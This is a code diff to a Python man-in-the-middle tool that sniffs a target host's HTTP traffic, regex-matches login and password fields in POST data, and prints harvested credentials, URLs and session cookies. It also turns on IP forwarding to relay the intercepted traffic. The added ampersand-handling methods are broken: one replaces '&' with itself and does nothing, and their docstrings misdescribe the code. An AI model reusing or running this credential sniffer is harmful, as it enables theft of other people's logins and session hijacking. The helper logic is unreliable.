@@ -66,12 +66,13 @@ class Device:
         sniff(iface=self.iface, prn=arp_pkt_callback,
               filter=f'arp and host {self.targetip}', store=0)
 
-     def http_sniff(self):
+
+    def http_sniff(self):
         def http_pkt_callback(pkt):
             if pkt.haslayer('Raw'):
                 raw_data = pkt['Raw'].load.decode(errors='ignore')
                 login_fields = ['heslo', 'passwd', 'pwd', 'user_id', 'pseudonym', 'phone',
-                                'password', 'user', 'username', 'login', 'pass', 'uname','userPass']
+                                'password', 'user', 'username', 'login', 'pass', 'uname', 'userPass']
                 creds_found = {}
                 url = "unknown"
                 show_dump = False
@@ -98,15 +99,13 @@ class Device:
                         pass
 
                 if "POST" in raw_data:
-                    # Parse body safely after headers
-                    if "\r\n\r\n" in raw_data:
-                        headers, body = raw_data.split("\r\n\r\n", 1)
-                        post_data = urllib.parse.parse_qs(body)
-
-                        for field in login_fields:
-                            if field in post_data:
-                                creds_found[field.lower()] = post_data[field][0]
-                                show_dump = True
+                    # Lowercase search for login keywords
+                    for field in login_fields:
+                        regex = re.compile(rf'{field}=([^&\s]+)', re.IGNORECASE)
+                        match = regex.search(raw_data)
+                        if match:
+                            creds_found[field.lower()] = match.group(1)
+                            show_dump = True
 
                     if show_dump:
                         login = "-"
@@ -117,9 +116,13 @@ class Device:
                             if key in ['password', 'pass', 'pwd', 'passwd', 'heslo']:
                                 pwd = creds_found[key]
 
+                        # Logic for handling multiple '&' characters in login/password
+                        login = self.handle_special_characters(login)
+                        pwd = self.handle_special_characters(pwd)
+
                         print(f"{Fore.GREEN}Credential Dump:{Style.RESET_ALL}")
                         print(f"{Fore.GREEN}    IP: {self.targetip} > LOGIN: {login}  PWD: {pwd}  SITE: {url}{Style.RESET_ALL}")
-                        print(f"{Fore.GREEN}    CONTENT: {body.strip()}{Style.RESET_ALL}")
+                        print(f"{Fore.GREEN}    CONTENT: {raw_data.strip().replace(chr(13), '').replace(chr(10), '')}{Style.RESET_ALL}")
 
                 if "Set-Cookie:" in raw_data:
                     cookies = raw_data.split("Set-Cookie: ")[1].split("\r\n")[0]
@@ -127,7 +130,29 @@ class Device:
 
         sniff(iface=self.iface, prn=http_pkt_callback,
               filter=f'tcp port 80 and host {self.targetip}', store=0)
-       
+
+    def handle_special_characters(self, input_str):
+        """
+        This method handles multiple consecutive '&' characters and ensures no mixing with cookies.
+        It replaces occurrences of multiple '&' with a controlled format.
+        """
+        count = input_str.count('&')
+        if count > 1:
+            # For multiple '&', print only one or handle accordingly
+            input_str = input_str.replace('&&', '&')  # Handle double '&' by showing one
+            input_str = self.handle_multiple_ampersands(input_str)
+        return input_str
+
+    def handle_multiple_ampersands(self, input_str):
+        """
+        This method will print multiple '&' characters in the credentials field based on their count.
+        If there are three '&', print two; if four, print three, etc.
+        """
+        ampersand_count = input_str.count('&')
+        if ampersand_count >= 3:
+            return input_str.replace('&', '&', ampersand_count - 1)  # Reduce extra '&'
+        return input_str
+
     def enable_ip_forwarding(self):
         subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
         print(f'{Fore.GREEN}IP forwarding enabled!{Style.RESET_ALL}')
